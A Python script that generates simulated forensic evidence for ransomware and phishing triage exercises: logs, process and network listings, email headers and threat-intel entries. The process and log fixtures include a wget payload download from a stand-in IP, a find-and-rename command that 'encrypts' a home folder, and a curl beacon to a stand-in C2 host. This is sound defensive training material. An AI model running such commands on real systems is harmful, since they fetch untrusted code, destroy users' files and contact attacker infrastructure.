from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
RNG = random.Random(42)


def write_text(relative_path: str, content: str) -> None:
    path = ROOT / relative_path
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8", newline="\n")


def write_json(relative_path: str, payload: object) -> None:
    write_text(relative_path, json.dumps(payload, indent=2, ensure_ascii=False) + "\n")


def write_bytes(relative_path: str, payload: bytes) -> None:
    path = ROOT / relative_path
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(payload)


def pseudo_random_bytes(count: int) -> bytes:
    return bytes(RNG.getrandbits(8) for _ in range(count))


def fake_sha256() -> str:
    return f"{RNG.getrandbits(256):064x}"


def generate_ransomware_data() -> None:
    alert = {
        "alert_id": "SIEM-RW-2026-0511-001",
        "severity": "high",
        "host": "victim-vm-01",
        "host_os": "Ubuntu 22.04",
        "detected_at_utc": "2026-05-11T08:14:22Z",
        "rule": "MASS_FILE_RENAME + UNUSUAL_OUTBOUND_443",
        "summary": "Mass file renaming with .locked extension and outbound traffic to non-categorized domain on port 443",
    }
    write_json("data/scenarios/ransomware/alert.json", alert)

    start = datetime(2026, 5, 10, 23, 0, tzinfo=timezone.utc)
    benign_messages = [
        "systemd[1]: Started Daily apt download activities.",
        "cron[1421]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)",
        "sshd[1834]: Accepted publickey for analyst from 198.51.100.24 port 50218 ssh2",
        "systemd-resolved[711]: Server returned error NXDOMAIN for status.local",
        "dbus-daemon[502]: [system] Activating via systemd: service name='org.freedesktop.resolve1'",
        "rsyslogd[604]: action 'omfwd' resumed (module 'builtin:omfwd')",
        "kernel: audit: type=1400 audit(0.0:0): apparmor=ALLOWED operation=connect profile=unconfined",
    ]
    lines: list[str] = []
    for index in range(1500):
        timestamp = (start + timedelta(minutes=index)).strftime("%Y-%m-%dT%H:%M:%SZ")
        if index == 198:
            message = "wget[2241]: downloaded payload from http://203.0.113.47/update.bin to /tmp/payload.bin"
        elif index == 421:
            message = "cryptdaemon[2248]: spawned child process /usr/bin/python3 /tmp/x.py"
        elif 520 <= index <= 620 and index % 10 == 0:
            sample = 100 + index
            message = f"rename[2310]: moved /home/victim/Documents/report-{sample}.docx to /home/victim/Documents/report-{sample}.docx.locked"
        elif index in {712, 913}:
            message = "curl[2399]: outbound TLS session to c2-relay.evil-corp-demo.test:443 established"
        elif index in {743, 744, 745}:
            message = "mv[2410]: renamed /home/victim/Pictures/holiday.jpg to /home/victim/Pictures/holiday.jpg.locked"
        else:
            message = benign_messages[index % len(benign_messages)]
        lines.append(f"{timestamp} victim-vm-01 {message}")
    write_text("data/scenarios/ransomware/syslog.log", "\n".join(lines) + "\n")

    processes = [
        {"pid": 1, "ppid": 0, "user": "root", "command": "/sbin/init", "state": "S"},
        {
            "pid": 502,
            "ppid": 1,
            "user": "messagebus",
            "command": "/usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile",
            "state": "S",
        },
        {"pid": 711, "ppid": 1, "user": "systemd-resolve", "command": "/lib/systemd/systemd-resolved", "state": "S"},
        {"pid": 880, "ppid": 1, "user": "root", "command": "/usr/sbin/cron -f", "state": "S"},
        {"pid": 1834, "ppid": 1, "user": "analyst", "command": "/usr/sbin/sshd -D", "state": "S"},
        {"pid": 2241, "ppid": 1834, "user": "victim", "command": "wget -O /tmp/payload.bin http://203.0.113.47/update.bin", "state": "R"},
        {"pid": 2248, "ppid": 2241, "user": "victim", "command": "cryptdaemon --config /etc/cryptdaemon.conf", "state": "R"},
        {"pid": 2249, "ppid": 2248, "user": "victim", "command": "python3 /tmp/x.py", "state": "R"},
        {"pid": 2254, "ppid": 2248, "user": "victim", "command": "/bin/sh -c find /home/victim -type f -not -name '*.locked' -exec mv {} {}.locked \\;", "state": "R"},
        {"pid": 2399, "ppid": 2248, "user": "victim", "command": "curl https://c2-relay.evil-corp-demo.test:443/beat", "state": "S"},
    ]
    write_json("data/scenarios/ransomware/processes.json", processes)

    netstat = [
        {
            "proto": "tcp",
            "local_address": "10.10.20.41:51124",
            "remote_address": "c2-relay.evil-corp-demo.test",
            "remote_port": 443,
            "state": "ESTABLISHED",
            "process": "cryptdaemon",
        },
        {
            "proto": "tcp",
            "local_address": "10.10.20.41:51125",
            "remote_address": "c2-relay.evil-corp-demo.test",
            "remote_port": 443,
            "state": "ESTABLISHED",
            "process": "curl",
        },
        {
            "proto": "udp",
            "local_address": "10.10.20.41:5353",
            "remote_address": "224.0.0.251",
            "remote_port": 5353,
            "state": "LISTEN",
            "process": "avahi-daemon",
        },
        {
            "proto": "tcp",
            "local_address": "10.10.20.41:22",
            "remote_address": "198.51.100.24",
            "remote_port": 50218,
            "state": "ESTABLISHED",
            "process": "sshd",
        },
    ]
    write_json("data/scenarios/ransomware/netstat.json", netstat)

    write_text(
        "data/scenarios/ransomware/tmp_files/README.txt",
        "Twoje pliki zostały zaszyfrowane. Aby je odzyskać, skontaktuj się: support@evil-corp-demo.test. Identyfikator ofiary: VC-9912.\n",
    )

    for index in range(1, 5):
        write_bytes(f"data/scenarios/ransomware/tmp_files/file{index}.locked", pseudo_random_bytes(64))


def generate_phishing_data(payload_hash: str) -> None:
    alert = {
        "alert_id": "SIEM-PH-2026-0511-014",
        "severity": "medium",
        "host": "analyst-workstation-07",
        "host_os": "Windows 11",
        "detected_at_utc": "2026-05-11T09:16:03Z",
        "rule": "SUSPICIOUS_EMAIL_CLICK + NEW_DOWNLOAD",
        "summary": "Analyst workstation clicked a suspicious email link and downloaded a fake invoice payload",
    }
    write_json("data/scenarios/phishing/alert.json", alert)

    headers = (
        "Received: from mailgw01.evil-corp-demo.test (mailgw01.evil-corp-demo.test [203.0.113.71])\n"
        "    by mx1.corporate.example with ESMTPS id 7F21B4C12A\n"
        "    for <analyst@corporate.example>; Mon, 11 May 2026 09:11:02 +0000\n"
        "Received: from relay.evil-corp-demo.test (relay.evil-corp-demo.test [203.0.113.47])\n"
        "    by mailgw01.evil-corp-demo.test with ESMTP id 7F21B4C10F\n"
        "    for <analyst@corporate.example>; Mon, 11 May 2026 09:10:58 +0000\n"
        "Return-Path: <noreply@bounce.evil-corp-demo.test>\n"
        "From: ksiegowosc@evil-corp-demo.test\n"
        "To: analyst@corporate.example\n"
        "Subject: Faktura zaległa #4471 — pilna płatność\n"
        "Date: Mon, 11 May 2026 09:10:52 +0000\n"
        "Message-ID: <20260511091052.4471@evil-corp-demo.test>\n"
        "Authentication-Results: mx1.corporate.example; spf=fail smtp.mailfrom=evil-corp-demo.test; dkim=none; dmarc=fail\n"
        "MIME-Version: 1.0\n"
        "Content-Type: text/plain; charset=UTF-8\n"
    )
    write_text("data/scenarios/phishing/email_headers.eml", headers)

    dns = (
        "2026-05-11T09:15:31Z analyst-workstation-07 resolver: query A intranet.corporate.example\n"
        "2026-05-11T09:15:34Z analyst-workstation-07 resolver: query A cdn.jsdelivr.net\n"
        "2026-05-11T09:15:47Z analyst-workstation-07 resolver: query A faktury-online.evil-corp-demo.test\n"
        "2026-05-11T09:15:48Z analyst-workstation-07 resolver: query A cdn.legitimate-bank.example\n"
    )
    write_text("data/scenarios/phishing/dns_queries.log", dns)

    browser_history = [
        {
            "visited_at_utc": "2026-05-11T09:10:51Z",
            "browser": "Chrome",
            "title": "Inbox - Corporate Webmail",
            "url": "https://mail.corporate.example/inbox",
        },
        {
            "visited_at_utc": "2026-05-11T09:15:40Z",
            "browser": "Chrome",
            "title": "Faktury online - portal",
            "url": "https://faktury-online.evil-corp-demo.test/login",
        },
        {
            "visited_at_utc": "2026-05-11T09:15:44Z",
            "browser": "Chrome",
            "title": "Pobierz fakturę",
            "url": "https://faktury-online.evil-corp-demo.test/download/faktura.exe",
        },
        {
            "visited_at_utc": "2026-05-11T09:16:02Z",
            "browser": "Chrome",
            "title": "Downloads",
            "url": "chrome://downloads/",
        },
    ]
    write_json("data/scenarios/phishing/browser_history.json", browser_history)

    write_text(
        "data/scenarios/phishing/payload_sample.txt",
        f"File name: faktura.exe\nSHA-256: {payload_hash}\nFile size: 18432 bytes\nMIME type: application/vnd.microsoft.portable-executable\nNotes: The sample is a harmless text fixture only; it is not an actual executable.\n",
    )


def generate_misp_fallback(payload_hash: str) -> None:
    fixtures = {
        "203.0.113.47": {
            "reputation": "malicious",
            "first_seen": "2025-12-03T11:02:18Z",
            "last_seen": "2026-05-10T22:47:09Z",
            "related_campaigns": ["LockedFiles2025"],
        },
        "c2-relay.evil-corp-demo.test": {
            "reputation": "malicious",
            "first_seen": "2025-12-11T09:15:02Z",
            "last_seen": "2026-05-11T08:14:21Z",
            "related_campaigns": ["LockedFiles2025"],
        },
        "evil-corp-demo.test": {
            "reputation": "malicious",
            "first_seen": "2026-04-29T07:10:00Z",
            "last_seen": "2026-05-11T09:10:52Z",
            "related_campaigns": ["InvoiceDropper2026"],
        },
        "faktury-online.evil-corp-demo.test": {
            "reputation": "malicious",
            "first_seen": "2026-05-02T14:05:18Z",
            "last_seen": "2026-05-11T09:16:02Z",
            "related_campaigns": ["InvoiceDropper2026"],
        },
        payload_hash: {
            "reputation": "malicious",
            "first_seen": "2026-05-11T09:15:44Z",
            "last_seen": "2026-05-11T09:16:03Z",
            "related_campaigns": ["InvoiceDropper2026"],
        },
        "legitimate-bank.example": {
            "reputation": "clean",
            "first_seen": "2020-01-01T00:00:00Z",
            "last_seen": "2026-05-11T09:15:48Z",
            "related_campaigns": [],
        },
        "support@evil-corp-demo.test": {
            "reputation": "malicious",
            "first_seen": "2026-05-11T08:14:22Z",
            "last_seen": "2026-05-11T08:14:22Z",
            "related_campaigns": ["LockedFiles2025"],
        },
        "ksiegowosc@evil-corp-demo.test": {
            "reputation": "malicious",
            "first_seen": "2026-05-11T09:10:52Z",
            "last_seen": "2026-05-11T09:10:52Z",
            "related_campaigns": ["InvoiceDropper2026"],
        },
        "noreply@bounce.evil-corp-demo.test": {
            "reputation": "malicious",
            "first_seen": "2026-05-11T09:10:52Z",
            "last_seen": "2026-05-11T09:10:52Z",
            "related_campaigns": ["InvoiceDropper2026"],
        },
        "https://faktury-online.evil-corp-demo.test/download/faktura.exe": {
            "reputation": "malicious",
            "first_seen": "2026-05-11T09:15:44Z",
            "last_seen": "2026-05-11T09:16:03Z",
            "related_campaigns": ["InvoiceDropper2026"],
        },
    }
    write_json("data/misp_fallback.json", fixtures)


def main() -> None:
    payload_hash = fake_sha256()
    generate_ransomware_data()
    generate_phishing_data(payload_hash)
    generate_misp_fallback(payload_hash)


if __name__ == "__main__":
    main()

